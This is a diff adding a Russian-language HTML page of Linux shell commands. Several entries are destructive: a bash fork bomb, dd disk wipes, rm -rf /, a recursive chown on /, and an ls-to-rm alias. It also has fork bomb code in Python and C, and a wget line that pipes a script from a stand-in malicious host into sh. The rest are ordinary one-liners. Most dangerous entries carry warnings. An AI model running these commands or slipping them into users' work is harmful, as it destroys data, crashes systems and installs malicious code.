+			<h2 id="131aa64c-9d0a-81e1-b930-d5685497ab63" class=""><strong>1.1. fork-бомба</strong></h2>
+			<p id="131aa64c-9d0a-8170-9c07-ee1ba2593dd6" class="">Эта «команда» при выполнении на ПК не представляет
+				особой угрозы, но вот ее запуск на сервере может привести к отказу в обслуживании.</p>
+			<p id="131aa64c-9d0a-813c-8f27-ce67cadef80b" class="">Выглядит она как странный набор символов, хотя на деле
+				это реальное определение функции bash.</p>
+			<p id="131aa64c-9d0a-8193-846c-d0d4091395ef" class="">В bash допускается использовать в качестве имени
+				функции <code>:</code>. И в случае выполнения команды<code> :()::&amp;;:</code> именно такую функцию мы
+				и создаем. Внутренне она рекурсивно вызывает сама себя, то есть выполняется бесконечно, а с помощью
+				<code>&amp;</code> мы инструктируем процесс выполняться фоново.</p>
+			<p id="131aa64c-9d0a-815e-ac77-c3e18c7ba5a5" class=""><code>$ :(){ :|: &amp; };:</code></p>
+			<h2 id="131aa64c-9d0a-81ae-9432-e3ba6335e638" class=""><strong>1.2. Прямая запись на жесткий диск</strong>
+			</h2>
+			<p id="131aa64c-9d0a-8133-be66-eb6e0203dc69" class="">Вы легко повредите файловую систему, если при
+				выполнении любой команды сохраните ее вывод на диск. Так кому же это может понадобиться?</p>
+			<p id="131aa64c-9d0a-81ca-b87d-fe279970e4ee" class=""><code>$ &quot;a command&quot; &gt; /dev/sda </code>
+			</p>
+			<h2 id="131aa64c-9d0a-81eb-b0ee-e12512fb508f" class=""><strong>1.3. Запись на диск случайных данных</strong>
+			</h2>
+			<p id="131aa64c-9d0a-8198-ac7c-dcafeedcb6aa" class="">Эта команда может пригодиться, например, для
+				перезаписи секторов диска с целью исключения возможности восстановления данных. Напомню, что при наличии
+				правильного инструмента вернуть данные после форматирования диска трудностей не составит.</p>
+			<p id="131aa64c-9d0a-81a7-a01e-e88257ecd22a" class="">Если использовать эту команду в цикле и выполнить ее
+				3-4 раза, то она в достаточной степени гарантирует невозможность восстановления удаленной информации.
+			</p>
+			<p id="131aa64c-9d0a-8107-884d-f3e4be74d84a" class=""><code>$ dd if=/dev/urandom of=/dev/disk </code></p>
+			<p id="131aa64c-9d0a-814d-aaab-f236cd390015" class="">
+				<code>//for i in {1..10}; do dd if=/dev/urandom of=/dev/disk; done</code></p>
+			<h2 id="131aa64c-9d0a-818b-8991-c1e05a7366d0" class=""><strong>1.4. Перезаписывает содержимое жесткого диска
+					нулями</strong></h2>
+			<p id="131aa64c-9d0a-8155-92d3-dc89f2a98910" class="">
+				<code>dd if=/dev/zero of=/dev/sda bs=1M:</code><br /><br /><strong>Потенциальные последствия</strong>:
+				Полная потеря данных на указанном диске без возможности восстановления.</p>
+			<h2 id="131aa64c-9d0a-812c-9131-d2664b38fef7" class=""><strong>1.5. Удалить все</strong></h2>
+			<p id="131aa64c-9d0a-81f7-9dde-f3f6d831318c" class="">Эта команда удаляет все, включая файлы на жестком
+				диске и подключенных устройствах, что делает ее очень опасной, поскольку разрешения она не спрашивает.
+			</p>
+			<p id="131aa64c-9d0a-813c-8c52-d793a77f6b75" class="">С помощью флага rf мы инструктируем ее выполняться
+				рекурсивно и удалять все файлы без запроса разрешения.</p>
+			<p id="131aa64c-9d0a-8108-bf5f-f7a346a410b7" class="">Символ / указывает, что начинать нужно с корневого
+				каталога, который содержит все файлы и все смонтированные устройства с данными, включая удаленные
+				файловые ресурсы и съемные диски. (прим. пер.: современные дистрибутивы не дают просто так удалить /,
+				надо либо добавить --no-preserve-root, либо удалять /* (все файлы в корневом каталоге).</p>
+			<p id="131aa64c-9d0a-815d-97f0-e035683780cb" class=""><code>$ rm -rf /</code></p>
+			<h1 id="131aa64c-9d0a-813b-a3da-e25fd08c76c4" class=""><strong>2. Регулярные команды</strong></h1>
+			<h2 id="131aa64c-9d0a-810a-8535-dd2c59dc5d39" class=""><strong>2.1. Определение самых используемых
+					команд</strong></h2>
+			<p id="131aa64c-9d0a-8172-a22a-e409d8714d74" class="">Эта однострочная инструкция удобна, когда мы хотим
+				узнать, какие команды чаще всего используем. С помощью -n X указывается количество, которое нужно
+				вывести. Например, n -10 отобразит 10.</p>
+			<p id="131aa64c-9d0a-8108-b41d-f1d1701fad62" class="">
+				<code>cat ~/.bash_history | tr &quot;\|\;&quot; &quot;\n&quot; | sed -e &quot;s/^ //g&quot; | cut -d &quot; &quot; -f 1 | sort | uniq -c | sort -n | tail -n 10</code>
+			</p>
+			<h2 id="131aa64c-9d0a-8101-be25-c5c573ab7b14" class=""><strong>2.2. Вывод из файла списка уникальных
+					слов</strong></h2>
+			<p id="131aa64c-9d0a-81d5-9952-e0965a74b7ba" class="">Следующая команда используется для вывода слов,
+				содержащих символы алфавита. Данная инструкция tr преобразует все не алфавитные символы в символы новой
+				строки, после чего команда sed эти пустые строки удаляет. В завершении с помощью sort выполняется
+				уникальная сортировка результатов с исключением повторений.</p>
+			<p id="131aa64c-9d0a-81c7-9768-c98267c75e58" class="">
+				<code>tr -c a-zA-Z &#x27;\n&#x27; &lt; someFile.txt | sed &#x27;/^$/d&#x27; | sort | uniq -i -c</code>
+			</p>
+			<h2 id="131aa64c-9d0a-81af-829a-e289c7439ae4" class=""><strong>2.3. Выделение цветом вывода ps</strong></h2>
+			<p id="131aa64c-9d0a-81b1-88bc-fbe45d7437c8" class="">Эта команда окрашивает вывод ps, показывая службы
+				красным, а ведущие процессы сеанса зеленым.</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-8176-a95a-fb4ec34a2f57" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Цвета Ascii: http://es.tldp.org/COMO-INSFLUG/COMOs/Bash-Prompt-Como/Bash-Prompt-Como-5.html
+</code></pre>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-815e-b726-c517a58e0861" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ps ajxf | awk &#x27;{ if($2 == $4) { if ($1 == 1) { print &quot;\033[35m&quot; $0&quot;\033[0m&quot;}  else print &quot;\033[1;32m&quot; $0&quot;\033[0m&quot; } else print $0 }&#x27;
+</code></pre>
+			<h2 id="131aa64c-9d0a-81ea-98cd-f04cb3a5aade" class=""><strong>2.4. Поиск последней команды, начинающейся с
+					“xxx”, без ее выполнения</strong></h2>
+			<p id="131aa64c-9d0a-81dc-a2be-c3fbae7947da" class="">В этом примере мы ищем первую команду, начинающуюся с
+				«cp».</p>
+			<p id="131aa64c-9d0a-810a-975a-c5ba95070a27" class=""><code>!cp:p</code></p>
+			<h2 id="131aa64c-9d0a-81b8-9a69-ed7df883624a" class=""><strong>2.5. Выполнение команды N раз</strong></h2>
+			<p id="131aa64c-9d0a-817b-b13b-ee38107691f2" class="">Тут все довольно очевидно: мы используем цикл и
+				команду, которая должна выполняться при каждой его итерации.</p>
+			<p id="131aa64c-9d0a-8144-a285-e34a9d6bda0d" class=""><code>for i in {1..10}; do command; done</code></p>
+			<h2 id="131aa64c-9d0a-8151-999f-d1551dc33bba" class=""><strong>2.6. Добавление часов в терминал</strong>
+			</h2>
+			<p id="131aa64c-9d0a-811f-93c9-ceb5c7b1f522" class="">Выполнение следующих команд приведет к добавлению в
+				терминал часов, которые останутся активны до его закрытия.</p>
+			<p id="131aa64c-9d0a-81a7-91de-c416b12502d3" class="">
+				<code>while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &amp;</code></p>
+			<h2 id="131aa64c-9d0a-81b0-be00-c1015930bdc1" class=""><strong>2.7. Поиск повторяющихся файлов </strong>
+			</h2>
+			<p id="131aa64c-9d0a-8112-879e-f46dbc395f23" class="">Удобный способ поиска дубликатов файлов, при котором
+				команда получает и сравнивает их хэш-значения.</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-8124-8459-f67e74bab5b9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">find -not -empty -type f -printf &quot;%s
+&quot; |  sort -rn |  uniq -d |  xargs -I{} -n1  find -type f -size {}c -print0 |  xargs -0  md5sum |  sort |  uniq -w32 --all-repeated=separate
+</code></pre>
+			<h2 id="131aa64c-9d0a-814c-9831-e80e49c4ae53" class=""><strong>2.8. Удаление всех файлов каталога, не
+					соответствующих заданному расширению</strong></h2>
+			<p id="131aa64c-9d0a-813b-ad5b-ff981eced38d" class="">Как часто у вас бывали случаи, когда нужно было
+				очистить каталог не от всех файлов? Вместо того, чтобы делать это поэтапно, можно провернуть операцию в
+				один шаг, указав файлы, которые нужно оставить.</p>
+			<p id="131aa64c-9d0a-81ef-9d58-f10114d059be" class=""><code>rm !(*.xls|*.slsx|*.csv)</code></p>
+			<h2 id="131aa64c-9d0a-818f-af37-da8be2840d8e" class=""><strong>2.9. Удалить все файлы, кроме одного</strong>
+			</h2>
+			<p id="131aa64c-9d0a-815d-9152-c67e8a0453ae" class="">Эта команда аналогична предыдущей, но здесь мы
+				обозначаем всего один файл, который нужно оставить.</p>
+			<p id="131aa64c-9d0a-8168-8491-cc5f27775138" class=""><code>rm -f !(theFile.txt)</code></p>
+			<h2 id="131aa64c-9d0a-8128-8bff-e6ed7e4cc930" class=""><strong>2.10. Генерация случайного пароля заданной
+					длины</strong></h2>
+			<p id="131aa64c-9d0a-81bb-ad1b-dcc25de62045" class="">Если вы, как и я, порой испытываете трудности с
+				придумыванием пароля, то за вас это может сделать оболочка.</p>
+			<p id="131aa64c-9d0a-8130-bb8c-d0314c0b7843" class=""><strong>Нужная длина при этом устанавливается флагом
+					-c.</strong></p>
+			<p id="131aa64c-9d0a-8170-b81b-f093b3881a53" class="">
+				<code>date +%s | sha256sum | base64 | head -c 8; echo</code></p>
+			<h2 id="131aa64c-9d0a-81b8-93a0-cd1dbe59ce35" class=""><strong>2.11. Рекурсивное удаление всех пустых
+					каталогов</strong></h2>
+			<p id="131aa64c-9d0a-8120-814a-c4164b5619e5" class=""><strong>Находит и удаляет все пустые
+					каталоги.</strong></p>
+			<p id="131aa64c-9d0a-81f4-a5b6-d196864c4c86" class=""><code>find . -type d -empty -delete</code></p>
+			<h2 id="131aa64c-9d0a-8162-844d-edd2f0ebdd39" class=""><strong>2.12. Копирование разрешений файла</strong>
+			</h2>
+			<p id="131aa64c-9d0a-81e0-a4a9-ea9e9039655c" class=""><strong>Инструкция ниже скопирует для file1 все
+					разрешения, установленные для file2.</strong></p>
+			<p id="131aa64c-9d0a-815d-9dd8-c28201db301b" class=""><code>chmod --reference file2 file1</code></p>
+			<p id="131aa64c-9d0a-8194-86f8-d11502c60520" class="">
+			</p>
+			<h2 id="131aa64c-9d0a-8139-8b6b-d26af89e236a" class=""><strong>2.13. Изменяет владельца и группу всех файлов
+					и каталогов в системе на указанного пользователя и группу</strong></h2>
+			<p id="131aa64c-9d0a-8107-b598-d0fc85232c8c" class=""><mark
+					class="highlight-red"><code>chown -R user:user /:</code></mark><br /><br /><strong>Потенциальные
+					последствия</strong>: Нарушение работы системы, так как это может изменить права доступа к системным
+				файлам и каталогам, что может привести к ошибкам и сбоям.<br /><br /></p>
+			<h2 id="131aa64c-9d0a-8167-8207-f3ed05617277" class=""><strong>2.14. К</strong>оманда создает псевдоним для
+				команды <code><strong>ls</strong></code>, делая так, что при вызове <code><strong>ls</strong></code>
+				будет вызываться <code><strong>rm</strong></code>.</h2>
+			<p id="131aa64c-9d0a-81ea-bb24-c627e0f25bbb" class="">
+				<code>echo &quot;alias ls=rm&quot; &gt;&gt; ~/.bashrc</code><br /><br /><strong>Потенциальные
+					последствия</strong>: Потеря данных из-за случайного удаления файлов при вызове команды
+				<code><strong>ls</strong></code>.</p>
+			<h2 id="131aa64c-9d0a-8136-baf5-f9a0f91954ca" class=""><strong>2.15. К</strong>оманда загружает скрипт
+				malware.sh с веб-сайта и немедленно выполняет его.</h2>
+			<p id="131aa64c-9d0a-81c7-a474-cd13be1598dd" class="">
+				<code>wget http://malicious-site.com/malware.sh -O - | sh:</code><br /> <br /><strong>Потенциальные
+					последствия</strong>: Установка и выполнение вредоносного кода, который может нанести вред вашей
+				системе или украсть вашу конфиденциальную информацию.</p>
+			<h2 id="131aa64c-9d0a-8189-9d90-dba2f095f443" class=""><strong>3. Создании fork-бомбы </strong></h2>
+			<ul id="131aa64c-9d0a-819f-8ac8-e4324d934561" class="bulleted-list">
+				<li style="list-style-type:disc">Обычно используется язык программирования, поддерживающий вызовы
+					fork(), такие как C или Python. Вот пример простой fork-бомбы на языке Python</li>
+			</ul>
+			<p id="131aa64c-9d0a-816d-8824-e23202105358" class=""><code>import os</code></p>
+			<p id="131aa64c-9d0a-81df-870c-d718226b9913" class="">
+				<code>def fork_bomb():<br/>while True:<br/>os.fork()<br/></code></p>
+			<p id="131aa64c-9d0a-8140-addb-f24ec8c09aeb" class=""><code>fork_bomb()</code></p>
+			<p id="131aa64c-9d0a-810f-abd6-ee433523fb92" class="">Этот скрипт рекурсивно вызывает себя, создавая новые
+				процессы на каждой итерации цикла. При достаточном количестве процессов система перегрузится и
+				перестанет реагировать.</p>
+			<p id="131aa64c-9d0a-8165-a16f-c540c6d0f7c6" class="">
+			</p>
+			<ul id="131aa64c-9d0a-8143-9fd4-e8b7f132f949" class="bulleted-list">
+				<li style="list-style-type:disc">Пример кода на языке C, который демонстрирует простую fork-бомбу</li>
+			</ul>
+			<p id="131aa64c-9d0a-813b-aa91-f4733669f5b4" class=""><code>#include &lt;unistd.h&gt;</code></p>
+			<p id="131aa64c-9d0a-8158-92ac-ce78369d3fb2" class="">
+				<code>int main() {<br/>while(1) {<br/>fork();<br/>}<br/>return 0;<br/>}<br/></code></p>
+			<p id="131aa64c-9d0a-81cb-8e2f-ee18522a3ef6" class="">Этот код создает бесконечный цикл, в котором
+				вызывается функция fork() для создания новых процессов. Каждый новый процесс продолжает этот процесс,
+				что приводит к экспоненциальному росту числа процессов и исчерпанию ресурсов системы.</p>
+		</div>
+	</article><span class="sans" style="font-size:14px;padding-top:2em"></span>
+</body>
+
+</html>
